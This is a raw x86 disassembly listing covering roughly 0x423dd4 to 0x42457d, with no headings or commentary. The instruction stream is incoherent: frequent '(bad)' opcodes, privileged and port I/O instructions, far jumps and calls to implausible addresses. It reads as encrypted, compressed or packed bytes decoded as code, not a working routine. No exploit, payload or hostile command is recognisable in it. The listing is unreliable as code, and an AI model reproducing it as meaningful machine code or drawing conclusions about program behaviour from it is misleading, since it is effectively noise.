  423dd4:	add    eax,0xe77dce03
  423dd9:	pop    edx
  423dda:	add    eax,0x5c2d7d35
  423ddf:	mov    esp,0x7f084715
  423de4:	inc    edi
  423de5:	loopne 0x423db3
  423de7:	and    ebp,DWORD PTR [edx+eax*4]
  423dea:	fistp  WORD PTR [ebx+0x5e]
  423ded:	jl     0x423d81
  423def:	and    esp,esp
  423df1:	nop
  423df2:	and    BYTE PTR [ebp-0x7e],0x52
  423df6:	fcomp  st(2)
  423df8:	sub    al,0x4
  423dfa:	or     eax,0x51be3c84
  423dff:	inc    edi
  423e00:	add    BYTE PTR ds:0xc283cdb6,cl
  423e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e07:	scas   eax,DWORD PTR es:[edi]
  423e08:	pop    eax
  423e09:	(bad)  [edx+0x271c0e73]
  423e0f:	pop    ecx
  423e10:	push   ds
  423e11:	cdq    
  423e12:	sbb    ebp,DWORD PTR [eax+0x1e]
  423e15:	add    edx,DWORD PTR [eax+0x485e961a]
  423e1b:	int3   
  423e1c:	sbb    ah,BYTE PTR gs:[edx+0x6593fd48]
  423e23:	mov    ah,dh
  423e25:	or     cl,BYTE PTR [edx+0x6f]
  423e28:	mov    ecx,0xa0a0aff4
  423e2d:	dec    eax
  423e2e:	pop    edi
  423e2f:	pop    ebp
  423e30:	jp     0x423e22
  423e32:	lea    edx,[edx+eiz*8+0x2becf770]
  423e39:	cdq    
  423e3a:	dec    esp
  423e3b:	jo     0x423e39
  423e3d:	xlat   BYTE PTR ds:[ebx]
  423e3e:	adc    BYTE PTR [edx-0x3],al
  423e41:	(bad)  
  423e43:	cmp    al,0xd2
  423e45:	retf   0x6200
  423e48:	out    dx,al
  423e49:	pop    esi
  423e4a:	or     ch,BYTE PTR [ecx+0x1949df88]
  423e50:	inc    edi
  423e51:	popa   
  423e52:	sub    BYTE PTR [esi-0x7b],bl
  423e55:	jne    0x423ec6
  423e57:	sbb    ebp,DWORD PTR [edi+0x7]
  423e5a:	cs fcomi st,st(3)
  423e5d:	out    dx,al
  423e5e:	jmp    0x423e29
  423e60:	inc    ecx
  423e61:	in     al,0xd8
  423e63:	jg     0x423ebd
  423e65:	jno    0x423ed1
  423e67:	xchg   esp,eax
  423e68:	xor    cl,dl
  423e6a:	clc    
  423e6b:	xor    ebp,DWORD PTR [ebp+edx*1-0x7c4bdaa]
  423e72:	loopne 0x423df6
  423e74:	mov    ds:0x3966509a,eax
  423e79:	adc    al,BYTE PTR [edx]
  423e7b:	jg     0x423ee4
  423e7d:	retf   
  423e7e:	in     al,dx
  423e7f:	inc    edx
  423e80:	or     al,0x96
  423e82:	xor    DWORD PTR [ebx-0x16],edi
  423e85:	dec    edx
  423e86:	clc    
  423e87:	cmp    ecx,edx
  423e89:	fldcw  WORD PTR [ecx+0x0]
  423e8c:	hlt    
  423e8d:	jae    0x423e45
  423e8f:	in     al,dx
  423e90:	and    BYTE PTR [esi],dl
  423e92:	mov    al,0xb2
  423e94:	xlat   BYTE PTR ds:[ebx]
  423e95:	loope  0x423e18
  423e97:	dec    edx
  423e98:	cwde   
  423e99:	iret   
  423e9a:	push   ds
  423e9b:	or     DWORD PTR [ebp+0x44de3ae9],edi
  423ea1:	aas    
  423ea2:	and    bh,ch
  423ea4:	inc    esi
  423ea5:	inc    bl
  423ea7:	dec    esp
  423ea8:	push   esi
  423ea9:	inc    edx
  423eaa:	mov    ds:0x9d29d0c0,eax
  423eaf:	es jns 0x423e8d
  423eb2:	std    
  423eb3:	ja     0x423e94
  423eb5:	test   ebx,eax
  423eb7:	in     al,dx
  423eb8:	out    dx,al
  423eb9:	les    eax,FWORD PTR [ebx]
  423ebb:	push   ss
  423ebc:	outs   dx,DWORD PTR ds:[esi]
  423ebd:	addr16 pop esp
  423ebf:	sar    BYTE PTR ds:0xcfae153,1
  423ec5:	mov    dl,0xe3
  423ec7:	cdq    
  423ec8:	and    al,0x8f
  423eca:	idiv   BYTE PTR ds:0xbef4b303
  423ed0:	inc    edx
  423ed1:	cmp    BYTE PTR [edi+0x16],cl
  423ed4:	xchg   ebx,eax
  423ed5:	clc    
  423ed6:	sub    bh,BYTE PTR [ebx]
  423ed8:	xabort 0xd2
  423edb:	aad    0x5
  423edd:	lods   eax,DWORD PTR ds:[esi]
  423ede:	mov    cl,0x30
  423ee0:	jbe    0x423f06
  423ee2:	das    
  423ee3:	das    
  423ee4:	jle    0x423ead
  423ee6:	push   esi
  423ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ee8:	sub    BYTE PTR [edi-0x27a61152],dl
  423eee:	dec    ecx
  423eef:	sbb    al,0x96
  423ef1:	mov    al,ds:0x9f96f98b
  423ef6:	test   BYTE PTR [eax],al
  423ef8:	shl    bl,0xd
  423efb:	push   0xffffff9c
  423efd:	pop    eax
  423efe:	inc    esi
  423eff:	fninit 
  423f01:	ja     0x423f70
  423f03:	jbe    0x423f0b
  423f05:	or     edi,esp
  423f07:	xor    dh,BYTE PTR [ebx+edi*1+0x15]
  423f0b:	pop    ds
  423f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f0d:	dec    edx
  423f0e:	stos   BYTE PTR es:[edi],al
  423f0f:	adc    ch,ch
  423f11:	xor    bh,BYTE PTR [eax-0x70]
  423f14:	mov    cl,0x8b
  423f16:	fs mov ecx,eax
  423f19:	mov    bh,0xba
  423f1b:	jns    0x423edc
  423f1d:	xor    bl,BYTE PTR ds:0x842316ed
  423f23:	repz push edi
  423f25:	dec    eax
  423f26:	in     al,dx
  423f27:	jmp    0x423ec5
  423f29:	test   BYTE PTR [edi+0x5b7f489e],dl
  423f2f:	jae    0x423f6e
  423f31:	call   DWORD PTR [edx+0x15c4c93c]
  423f37:	nop
  423f38:	xor    al,0x6a
  423f3a:	xchg   edx,eax
  423f3b:	cld    
  423f3c:	add    ebx,0xc
  423f3f:	call   0x7b0ff5a8
  423f44:	fidivr WORD PTR [ebx]
  423f46:	xchg   ebx,eax
  423f47:	sub    DWORD PTR [ebx],ecx
  423f49:	add    BYTE PTR ss:[ebp+0x2438],dh
	...
  423f58:	add    BYTE PTR [eax],al
  423f5a:	cmp    DWORD PTR [ecx+ecx*4],ebx
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0xb7e902b9
  423f67:	lds    eax,FWORD PTR fs:[edx-0x64]
  423f6b:	mov    eax,0x1fc0001
  423f70:	add    BYTE PTR [eax],al
  423f72:	leave  
  423f73:	ret    
  423f74:	sar    BYTE PTR [ecx],cl
  423f76:	mov    eax,0xfc348c94
  423f7b:	call   0xb5764068
  423f80:	les    edx,FWORD PTR [eax+0x3d]
  423f83:	dec    esp
  423f84:	clts   
  423f86:	int    0x24
  423f88:	mov    ds:0x51969b5a,eax
  423f8d:	inc    esi
  423f8e:	adc    bh,BYTE PTR [esi+ebx*1]
  423f91:	mov    ebp,edi
  423f93:	adc    DWORD PTR [eax-0xe],0xffffff9e
  423f97:	mov    dl,0xd7
  423f99:	fs mov ebp,0x14e410b8
  423f9f:	stos   DWORD PTR es:[edi],eax
  423fa0:	stc    
  423fa1:	into   
  423fa2:	icebp  
  423fa3:	add    ah,BYTE PTR [edi-0x4a03e722]
  423fa9:	dec    ebx
  423faa:	xor    al,0x70
  423fac:	dec    eax
  423fad:	into   
  423fae:	jge    0x423f73
  423fb0:	out    0xc,al
  423fb2:	jp     0x42402e
  423fb4:	cmp    DWORD PTR [edx],esp
  423fb6:	lods   eax,DWORD PTR ds:[esi]
  423fb7:	ret    
  423fb8:	xchg   ebp,eax
  423fb9:	xchg   ebx,eax
  423fba:	fcmove st,st(1)
  423fbc:	mov    ah,0x3c
  423fbe:	add    dl,al
  423fc0:	xchg   edx,eax
  423fc1:	mov    BYTE PTR [esi],bh
  423fc3:	mov    eax,0x963390c4
  423fc8:	aaa    
  423fc9:	js     0x423f59
  423fcb:	sbb    ah,BYTE PTR [ebp-0x29]
  423fce:	sub    dl,ch
  423fd0:	mov    eax,ds:0x59d62207
  423fd5:	pop    esi
  423fd6:	(bad)  
  423fd7:	shl    ecx,cl
  423fd9:	or     ebx,DWORD PTR [ebp+0x6048bbc8]
  423fdf:	call   DWORD PTR [edx]
  423fe1:	xor    DWORD PTR [esi],0xffffff80
  423fe4:	cmp    ebp,eax
  423fe6:	pop    edi
  423fe7:	cmp    ch,BYTE PTR [ebx]
  423fe9:	enter  0x7b05,0x17
  423fed:	std    
  423fee:	test   eax,0x27ea1319
  423ff3:	sar    DWORD PTR [ebx-0x328d1fa8],1
  423ff9:	call   0xf399:0xe81723e1
  424000:	imul   ebx,ebx,0xffffff8b
  424003:	push   eax
  424004:	lea    esp,[eax-0x68]
  424007:	pop    ecx
  424008:	adc    al,0xd2
  42400a:	int3   
  42400b:	cmp    DWORD PTR [edx],esp
  42400d:	fwait
  42400e:	ins    BYTE PTR es:[edi],dx
  42400f:	mov    bh,cl
  424011:	popf   
  424012:	pop    ebx
  424013:	mov    dl,bh
  424015:	jmp    0xa0b8:0x16d0a167
  42401c:	jecxz  0x423ff6
  42401e:	sar    DWORD PTR [ebx+esi*8-0x96aed61],0xf8
  424026:	retf   
  424027:	dec    ebp
  424028:	mov    dl,0xe3
  42402a:	push   0xc52039f3
  42402f:	out    dx,eax
  424030:	loopne 0x424049
  424032:	add    ch,BYTE PTR [ebx+0x6ab2387e]
  424038:	retf   0x221a
  42403b:	mov    edi,0x958e3da3
  424040:	dec    edi
  424041:	cmc    
  424042:	mov    edi,es
  424044:	mov    ds:0xb292b015,al
  424049:	inc    edx
  42404a:	and    BYTE PTR [edx-0x20],cl
  42404d:	xor    dl,bl
  42404f:	jg     0x423fe0
  424051:	xchg   esi,eax
  424052:	neg    BYTE PTR [edi-0x11]
  424055:	jg     0x424062
  424057:	rol    BYTE PTR [esi-0x7164ee4d],1
  42405d:	call   0x1d08:0x15c4e46b
  424064:	adc    BYTE PTR [ebx+edi*4+0x7d],cl
  424068:	pop    es
  424069:	pop    edi
  42406a:	xor    bh,BYTE PTR [ecx]
  42406c:	sbb    BYTE PTR [eax],bh
  42406e:	pop    edx
  42406f:	scas   al,BYTE PTR es:[edi]
  424070:	sti    
  424071:	int    0x7e
  424073:	fwait
  424074:	ins    BYTE PTR es:[edi],dx
  424075:	xor    eax,0x56716bd8
  42407a:	outs   dx,BYTE PTR ds:[esi]
  42407b:	inc    esp
  42407c:	xlat   BYTE PTR ds:[ebx]
  42407d:	loopne 0x4240dd
  42407f:	jnp    0x424043
  424081:	jmp    0xa9604e79
  424086:	test   DWORD PTR [ebx+0x502ec040],ecx
  42408c:	out    0x23,eax
  42408e:	std    
  42408f:	xchg   esp,eax
  424090:	sbb    DWORD PTR [eax-0x5c],ecx
  424093:	or     BYTE PTR [edi-0x66631f9f],ah
  424099:	mov    ch,0x1d
  42409b:	enter  0xb4b7,0x70
  42409f:	fsubr  QWORD PTR ds:0x33e8fbcf
  4240a5:	je     0x424069
  4240a7:	int3   
  4240a8:	test   eax,0xb2603bbe
  4240ad:	push   esp
  4240ae:	jecxz  0x42405d
  4240b0:	rol    DWORD PTR [edx+0xf],0xf2
  4240b4:	scas   al,BYTE PTR es:[edi]
  4240b5:	pop    esi
  4240b6:	xor    BYTE PTR [ecx+ecx*8-0x6],ah
  4240ba:	into   
  4240bb:	fadd   QWORD PTR [edi-0x53f726c1]
  4240c1:	(bad)  
  4240c2:	dec    esp
  4240c3:	xchg   edx,eax
  4240c4:	pushf  
  4240c5:	and    BYTE PTR ds:0x8445f122,bl
  4240cb:	mov    al,ds:0x9ab20d79
  4240d0:	sub    BYTE PTR [ecx+0x13017aca],bl
  4240d6:	inc    edi
  4240d7:	ins    BYTE PTR es:[edi],dx
  4240d8:	xor    ebx,DWORD PTR [edi]
  4240da:	add    eax,0xb0e2c86c
  4240df:	xor    dl,ah
  4240e1:	pop    esi
  4240e2:	xor    eax,0x88348815
  4240e7:	push   ebp
  4240e8:	xchg   BYTE PTR [edi+eax*1],bl
  4240eb:	and    DWORD PTR [esi+0x33],eax
  4240ee:	stos   BYTE PTR es:[edi],al
  4240ef:	inc    esi
  4240f0:	mov    cl,0x9a
  4240f2:	pop    ebp
  4240f3:	inc    edi
  4240f4:	les    esp,FWORD PTR [eax-0x1f123676]
  4240fa:	fcmovnb st,st(3)
  4240fc:	cmp    BYTE PTR [ebx-0x3a],ah
  4240ff:	sbb    dh,BYTE PTR [ebp+0x6d]
  424102:	inc    edi
  424103:	xchg   BYTE PTR [ebp-0x49586a79],dl
  424109:	(bad)  
  42410a:	fsub   QWORD PTR [ebx+0x110aeda8]
  424110:	inc    esp
  424111:	lods   al,BYTE PTR ds:[esi]
  424112:	jmp    0x4240b3
  424114:	inc    BYTE PTR [edi+ebx*2-0x33]
  424118:	outs   dx,BYTE PTR ds:[esi]
  424119:	adc    al,cl
  42411b:	push   cs
  42411c:	data16 mov BYTE PTR [edx-0x3b],dl
  424120:	sub    ch,BYTE PTR [ecx-0x3ca553dd]
  424126:	rcl    esi,cl
  424128:	in     eax,dx
  424129:	stos   BYTE PTR es:[edi],al
  42412a:	push   ebx
  42412b:	and    BYTE PTR [esi],dl
  42412d:	mov    ecx,DWORD PTR [esi+0x57]
  424130:	jne    0x4240dd
  424132:	cdq    
  424133:	dec    ebp
  424134:	jle    0x42417d
  424136:	loopne 0x424111
  424138:	jbe    0x424170
  42413a:	sub    DWORD PTR [edx-0x11d656e1],0xffffff83
  424141:	xchg   ebp,eax
  424142:	jns    0x4241ab
  424144:	adc    BYTE PTR [esi],ch
  424146:	jmp    0xba0e:0x29b71476
  42414d:	and    edi,ecx
  42414f:	pusha  
  424150:	ret    0xd9de
  424153:	push   esi
  424154:	cld    
  424155:	adc    al,0xce
  424157:	push   edi
  424158:	inc    ebp
  424159:	mov    al,ds:0xbedfe473
  42415e:	mov    edx,0x84df986a
  424163:	pop    edx
  424164:	addr16 aaa 
  424166:	leave  
  424167:	xchg   ebp,esi
  424169:	mov    bh,BYTE PTR [esi]
  42416b:	sbb    BYTE PTR [ebx+0x1e],al
	...
  42417a:	gs mov ah,0x18
  42417d:	fcompp 
  42417f:	(bad)  
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	test   al,0x7a
  424188:	push   ds
  424189:	mov    edx,0x1ba98
  42418e:	cld    
  42418f:	add    DWORD PTR [eax],eax
  424191:	add    BYTE PTR [edx+0x1681333c],bl
  424197:	fldenv [ecx]
  424199:	out    0xf8,al
  42419b:	fmul   st(7),st
  42419d:	or     eax,0x29e85c3a
  4241a2:	pcmpgtb mm6,QWORD PTR [edx]
  4241a5:	lods   eax,DWORD PTR ds:[esi]
  4241a6:	nop
  4241a7:	sbb    ebp,DWORD PTR [ebx]
  4241a9:	inc    ebx
  4241aa:	shl    BYTE PTR [ecx],1
  4241ac:	jae    0x424139
  4241ae:	enter  0xeac,0x21
  4241b2:	fs mov ebp,0x50d48ee6
  4241b8:	mov    ?,WORD PTR [esi+0x7d]
  4241bb:	and    DWORD PTR [esi+ebp*1+0x77c93f01],ebx
  4241c2:	cmp    al,0x3e
  4241c4:	cli    
  4241c5:	sbb    edx,edi
  4241c7:	xchg   DWORD PTR [edx+0x7b],edi
  4241ca:	sbb    ecx,DWORD PTR [ecx-0x68865b45]
  4241d0:	mov    eax,0x91014613
  4241d5:	jl     0x424182
  4241d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241d8:	and    DWORD PTR ds:0x2e019c53,ebx
  4241de:	lds    ebp,FWORD PTR [edi+0x70e00f2f]
  4241e4:	mov    ah,bl
  4241e6:	xor    BYTE PTR [esi+ebp*1-0x59983819],ch
  4241ed:	cmc    
  4241ee:	arpl   WORD PTR [edx],bp
  4241f0:	iret   
  4241f1:	sub    eax,0x78263eb
  4241f6:	sub    edi,eax
  4241f8:	jp     0x4241f8
  4241fa:	xor    al,BYTE PTR [ebp-0x2aa363d3]
  424200:	mov    ds:0x5015d26b,al
  424205:	mov    dh,0x1e
  424207:	mov    ds:0x251b3bb1,eax
  42420c:	xlat   BYTE PTR ds:[ebx]
  42420d:	pop    esi
  42420e:	fcomp  QWORD PTR [ebx+0x1f]
  424211:	xlat   BYTE PTR ds:[ebx]
  424212:	test   al,0x20
  424214:	in     eax,0x36
  424216:	scas   al,BYTE PTR es:[edi]
  424217:	adc    edi,ecx
  424219:	inc    ecx
  42421a:	jg     0x4241da
  42421c:	loopne 0x42424a
  42421e:	mul    edx
  424220:	cmp    eax,0xbd60f1f4
  424225:	loope  0x4241fb
  424227:	cdq    
  424228:	es ret 
  42422a:	in     al,dx
  42422b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42422c:	sub    al,0x9
  42422e:	repz (bad) 
  424230:	sti    
  424231:	and    cl,BYTE PTR [edx]
  424233:	or     ebx,edi
  424235:	pop    ds
  424236:	imul   esp,DWORD PTR [ecx+0x4d841ccb],0x34
  42423d:	push   edx
  42423e:	pop    ecx
  42423f:	sub    al,0x23
  424241:	out    dx,al
  424242:	(bad)  
  424243:	mov    dl,0xb8
  424245:	inc    esp
  424246:	imul   eax,DWORD PTR [edx],0xffc00a95
  42424c:	xchg   BYTE PTR [edi],dl
  42424e:	cmp    DWORD PTR [eax-0x75a7bea6],ebp
  424254:	outs   dx,BYTE PTR ds:[esi]
  424255:	int3   
  424256:	lea    edx,[edi+0x3f2f882e]
  42425c:	repz daa 
  42425e:	jae    0x424267
  424260:	(bad)  
  424262:	cmp    eax,0x36726310
  424267:	scas   al,BYTE PTR es:[edi]
  424268:	push   es
  424269:	cmp    DWORD PTR [eax-0x3d2b5e56],ecx
  42426f:	add    eax,0x4676686e
  424274:	sbb    eax,0x452701d6
  424279:	sbb    al,0xa6
  42427b:	sbb    ebx,DWORD PTR [edi-0x4b]
  42427e:	sub    bh,BYTE PTR [esi+0x3c]
  424281:	mov    eax,ds:0x5870e720
  424286:	mov    ch,0xbb
  424288:	cmp    BYTE PTR [ebx],dh
  42428a:	xor    al,0x7c
  42428c:	popa   
  42428d:	xor    eax,0xb16aca35
  424292:	push   ebx
  424293:	inc    ebx
  424294:	into   
  424295:	les    ecx,FWORD PTR [edi]
  424297:	in     al,0x2f
  424299:	(bad)  
  42429a:	xchg   ebp,eax
  42429b:	out    0xf5,eax
  42429d:	mov    esp,0x27b73df4
  4242a2:	int3   
  4242a3:	fild   DWORD PTR [eax+esi*2]
  4242a6:	es xchg DWORD PTR fs:[edx-0x53],edi
  4242ab:	std    
  4242ac:	mov    al,0x20
  4242ae:	test   BYTE PTR [edx+0x7ae6ea67],al
  4242b4:	aad    0xe4
  4242b6:	pop    edi
  4242b7:	in     al,dx
  4242b8:	dec    ebx
  4242b9:	adc    DWORD PTR [esi],edi
  4242bb:	pop    ds
  4242bc:	(bad)  
  4242bd:	ds js  0x4242aa
  4242c0:	in     eax,0x36
  4242c2:	pusha  
  4242c3:	inc    ecx
  4242c4:	pop    ss
  4242c5:	dec    ebp
  4242c6:	push   es
  4242c7:	cmc    
  4242c8:	test   BYTE PTR [edi-0x1b],0xdb
  4242cc:	cmp    eax,DWORD PTR [edx]
  4242ce:	cmp    BYTE PTR [ebx-0x3],dl
  4242d1:	push   0x50d5e6e1
  4242d6:	jno    0x42426d
  4242d8:	jnp    0x4242ab
  4242da:	cmp    DWORD PTR [eax+0x16ead976],edx
  4242e0:	dec    eax
  4242e1:	imul   eax,edx,0x5a
  4242e4:	lods   al,BYTE PTR ds:[esi]
  4242e5:	outs   dx,DWORD PTR ds:[esi]
  4242e6:	jg     0x424275
  4242e8:	mov    eax,0xfc87c448
  4242ed:	and    al,0x20
  4242ef:	clc    
  4242f0:	in     eax,0xd7
  4242f2:	jg     0x42433d
  4242f4:	xchg   ebp,eax
  4242f5:	inc    esp
  4242f6:	jnp    0x4242a7
  4242f8:	out    dx,eax
  4242f9:	sub    dh,bl
  4242fb:	stos   BYTE PTR es:[edi],al
  4242fc:	(bad)  
  4242fd:	fnstenv [edi+0x32d7cf1]
  424303:	sti    
  424304:	jns    0x4242a0
  424306:	mov    BYTE PTR [edx+0x75f2e937],0xa
  42430d:	cmp    al,0x71
  42430f:	mov    edi,0x267aba47
  424314:	lahf   
  424315:	cli    
  424316:	pushf  
  424317:	ja     0x4242e4
  424319:	icebp  
  42431a:	int    0x71
  42431c:	fisubr WORD PTR [edi]
  42431e:	pop    esp
  42431f:	sar    BYTE PTR [esp+ebx*4+0x5e08461d],0x68
  424327:	aad    0xcf
  424329:	jecxz  0x424370
  42432b:	sub    BYTE PTR [edi+0x2c56e856],bh
  424331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424332:	jns    0x42431a
  424334:	out    0x2,al
  424336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424337:	adc    DWORD PTR [esi-0x2],ecx
  42433a:	adc    ebx,DWORD PTR [esi-0x23]
  42433d:	rcr    BYTE PTR [ebp-0x4c],0x51
  424341:	inc    edi
  424342:	sti    
  424343:	jns    0x4242c9
  424345:	and    ebx,DWORD PTR [edi-0x9]
  424348:	push   esi
  424349:	cmp    eax,ebp
  42434b:	mov    bh,0xa5
  42434d:	inc    ebp
  42434e:	ror    BYTE PTR ds:0xd82e9b01,1
  424354:	mov    cl,0x47
  424356:	clc    
  424357:	dec    esp
  424358:	jbe    0x42438c
  42435a:	pop    ds
  42435b:	dec    edi
  42435c:	rcr    BYTE PTR [esi-0x3b],cl
  42435f:	sbb    al,0x3c
  424361:	jno    0x424316
  424363:	leave  
  424364:	lock mov ds,esp
  424367:	xchg   edi,edx
  424369:	pop    es
  42436a:	aad    0x13
  42436c:	test   eax,0xb80035e9
  424371:	push   ds
  424372:	mov    ecx,0xe8950d9
  424377:	mov    ecx,0x842276c5
  42437c:	jmp    0x42436a
  42437e:	mov    dl,0xdc
  424380:	outs   dx,DWORD PTR ds:[esi]
  424381:	(bad)  
  424382:	mov    DWORD PTR [ebx],eax
  424384:	xor    dh,dl
  424386:	cmp    dl,bh
  424388:	imul   ecx,DWORD PTR [ebp+0x6f1b3793],0x0
	...
  424397:	add    BYTE PTR [eax],al
  424399:	add    BYTE PTR [edx],dl
  42439b:	fsub   DWORD PTR [ebx+0x72]
  42439e:	jmp    0x42439b
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	sub    eax,DWORD PTR [ebx+0x5d]
  4243a9:	inc    esi
  4243aa:	xchg   esp,eax
  4243ab:	mov    esp,0x1fc0001
  4243b0:	add    BYTE PTR [eax],al
  4243b2:	xchg   esi,eax
  4243b3:	pusha  
  4243b4:	push   ss
  4243b5:	pop    edx
  4243b6:	pushf  
  4243b7:	sbb    BYTE PTR [ebx],0xe3
  4243ba:	sbb    DWORD PTR ds:[ebp-0x69],edi
  4243be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243bf:	(bad)  
  4243c0:	jae    0x424441
  4243c2:	hlt    
  4243c3:	xchg   BYTE PTR [edx-0x6],ch
  4243c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243c7:	and    al,0x58
  4243c9:	sahf   
  4243ca:	mov    cl,BYTE PTR [ecx+0x341706e1]
  4243d0:	push   ebp
  4243d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243d2:	ret    0xfe46
  4243d5:	(bad)  
  4243d6:	in     al,0xa8
  4243d8:	dec    ecx
  4243d9:	ins    BYTE PTR es:[edi],dx
  4243da:	jbe    0x424455
  4243dc:	push   0xfffffff5
  4243de:	cld    
  4243df:	pop    edi
  4243e0:	inc    ebp
  4243e1:	mov    ds:0x4d3c1fa8,eax
  4243e6:	enter  0x80af,0xcc
  4243ea:	inc    edx
  4243eb:	cdq    
  4243ec:	addr16 inc ebx
  4243ee:	enter  0x6d23,0x7
  4243f2:	jnp    0x42437f
  4243f4:	fnstcw WORD PTR [ecx+0x1b]
  4243f7:	add    ebx,ebp
  4243f9:	mov    ds:0x3ada85a2,al
  4243fe:	add    esp,DWORD PTR [ebx-0x42]
  424401:	inc    esi
  424402:	or     eax,0x764345d3
  424407:	sbb    eax,0x79498118
  42440c:	jmp    FWORD PTR [ecx]
  42440e:	loopne 0x424408
  424410:	gs dec edi
  424412:	dec    ebx
  424413:	sub    bl,cl
  424415:	sub    edi,eax
  424417:	cdq    
  424418:	aas    
  424419:	(bad)  
  42441a:	cmp    ch,BYTE PTR [eax-0x787d26db]
  424420:	inc    esp
  424421:	xchg   edi,eax
  424422:	(bad)  
  424423:	fsubr  st(3),st
  424425:	adc    ecx,eax
  424427:	dec    ecx
  424428:	mov    dl,bl
  42442a:	sbb    DWORD PTR [ecx+eax*2],edi
  42442d:	mov    bl,0x55
  42442f:	jmp    0x4243ed
  424431:	popa   
  424432:	loop   0x4243e0
  424434:	sbb    al,0x8a
  424436:	inc    edi
  424437:	cmp    edx,DWORD PTR [edi]
  424439:	arpl   WORD PTR [edx-0x21],bx
  42443c:	int3   
  42443d:	mov    bl,0xb3
  42443f:	mov    cl,0x79
  424441:	nop
  424442:	(bad)  
  424443:	int3   
  424444:	inc    esp
  424445:	mov    ah,0x2f
  424447:	xchg   edi,eax
  424448:	sub    BYTE PTR [ecx-0x3bb4e278],cl
  42444e:	mov    BYTE PTR [edx+0x27],dl
  424451:	gs jne 0x4243ff
  424454:	cmp    DWORD PTR gs:[edi+0x6873d513],edx
  42445b:	add    ebp,esp
  42445d:	call   0xa5b5513e
  424462:	pop    edi
  424463:	add    BYTE PTR [edx],bl
  424465:	lahf   
  424466:	sub    DWORD PTR [ebx+0x32],edx
  424469:	inc    ebp
  42446a:	in     eax,0x6d
  42446c:	pop    ecx
  42446d:	ret    0x7230
  424470:	js     0x4244ac
  424472:	test   DWORD PTR [edi],eax
  424474:	das    
  424475:	sbb    DWORD PTR [ebp-0x7f],ebp
  424478:	jp     0x42446b
  42447a:	test   DWORD PTR [edi-0x764d4c97],0x549d02b
  424484:	adc    bl,BYTE PTR [ebp-0x154d7033]
  42448a:	dec    ecx
  42448b:	ret    0x1f13
  42448e:	jo     0x424469
  424490:	shr    BYTE PTR [ecx],0xe5
  424493:	xchg   ebx,eax
  424494:	shl    cl,0x4a
  424497:	sbb    ch,bl
  424499:	pop    ebp
  42449a:	push   esi
  42449b:	xchg   ebp,eax
  42449c:	mov    ds:0x1f187393,eax
  4244a1:	mov    dh,0xe3
  4244a3:	push   esi
  4244a4:	nop
  4244a5:	add    DWORD PTR [esi+eax*8-0x6f4871bd],ecx
  4244ac:	mov    cl,0xe4
  4244ae:	shl    eax,0xc7
  4244b1:	xchg   edi,eax
  4244b2:	push   0xffffffc9
  4244b4:	pusha  
  4244b5:	test   eax,0xd10fc827
  4244ba:	add    eax,0xd391f05c
  4244bf:	lea    eax,[edi-0x73]
  4244c2:	clc    
  4244c3:	lock xchg BYTE PTR ds:0xe9f3dced,bl
  4244ca:	xchg   BYTE PTR [eax],ch
  4244cc:	or     BYTE PTR [ebx],bh
  4244ce:	mov    ah,0xcb
  4244d0:	pop    ebp
  4244d1:	aam    0x6f
  4244d3:	or     dh,BYTE PTR [esi-0x4b]
  4244d6:	and    edx,DWORD PTR [edx-0xf020dd]
  4244dc:	adc    BYTE PTR [edx+0x55],cl
  4244df:	and    al,0x7a
  4244e1:	and    al,ch
  4244e3:	xor    DWORD PTR [edx],edx
  4244e5:	add    ecx,ebx
  4244e7:	jo     0x424472
  4244e9:	cmp    eax,0xbb06efc7
  4244ee:	pop    edi
  4244ef:	out    0x61,al
  4244f1:	repnz lea esi,[ebx+eiz*1]
  4244f5:	push   eax
  4244f6:	lods   eax,DWORD PTR ds:[esi]
  4244f7:	mov    DWORD PTR [ecx+ebx*2],esp
  4244fa:	pusha  
  4244fb:	outs   dx,DWORD PTR ds:[esi]
  4244fc:	adc    esp,edi
  4244fe:	cwde   
  4244ff:	call   FWORD PTR [ebp+0x13039b2e]
  424505:	mov    WORD PTR [ecx],fs
  424507:	jge    0x424576
  424509:	loop   0x4244f7
  42450b:	imul   ebp,DWORD PTR [edx+0x781c5f2a],0xeef68bb0
  424515:	adc    BYTE PTR [ebp-0x3a],cl
  424518:	in     al,dx
  424519:	jae    0x4244bd
  42451b:	imul   BYTE PTR [esi-0x1167c89f]
  424521:	or     al,0xe2
  424523:	and    al,0x38
  424525:	stos   DWORD PTR es:[edi],eax
  424526:	mov    cl,0xb4
  424528:	mov    cl,0xdc
  42452a:	mov    bh,0x42
  42452c:	mov    dh,0x25
  42452e:	xchg   BYTE PTR [ebx],dh
  424530:	mov    ebx,0x6fe2833
  424535:	jge    0x4245ac
  424537:	mov    ah,0xc0
  424539:	ret    
  42453a:	fnstcw WORD PTR [ecx+ebp*2]
  42453d:	(bad)  
  42453e:	adc    esi,DWORD PTR [edi]
  424540:	adc    al,0xc5
  424542:	jns    0x4245b1
  424544:	popf   
  424545:	(bad)  
  424547:	sar    edi,0xbc
  42454a:	out    dx,al
  42454b:	and    BYTE PTR [edx+esi*1+0x68c419f9],0x15
  424553:	js     0x424536
  424555:	retf   0xed6c
  424558:	shl    ebp,cl
  42455a:	(bad)  
  42455c:	ret    
  42455d:	arpl   WORD PTR [edi],dx
  42455f:	sub    esi,ebx
  424561:	sbb    esp,0x6d46df6b
  424567:	dec    esp
  424568:	sub    edx,ebx
  42456a:	int3   
  42456b:	lods   al,BYTE PTR ds:[esi]
  42456c:	lds    ebx,FWORD PTR [ebx+0x59]
  42456f:	mov    BYTE PTR [edx+esi*1-0x59950987],dl
  424576:	in     al,0x11
  424578:	mov    al,0xd5
  42457a:	xor    cl,cl
  42457c:	aaa    
  42457d:	clc    
